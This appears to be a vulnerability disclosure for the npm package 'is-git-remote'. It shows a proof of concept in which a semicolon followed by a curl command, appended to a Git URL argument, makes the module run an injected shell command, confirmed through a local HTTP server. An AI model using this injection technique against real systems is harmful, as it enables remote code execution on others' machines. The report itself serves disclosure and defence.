# Overview

The issue occurs because a `user input` is formatted inside a `command` that will be executed without any check.

1. Create the following PoC file:

```js
// poc.js
const isGitRemote = require("is-git-remote");
isGitRemote.default(
  'https://github.com/Mik317/PyScan.git;curl "http://localhost/RCE"'
);
```

2. Run a `py` server in order to verify the `cUrl` command: `python3 -m http.server 80`
3. Execute the following commands in another terminal:

```bash
npm i is-git-remote # Install affected module
git init # Avoid problems with the file validation
node poc.js #  Run the PoC
```

4. The `cUrl` command will be executed ... and the `py` server will receive a request to the `http://localhost/RCE` address
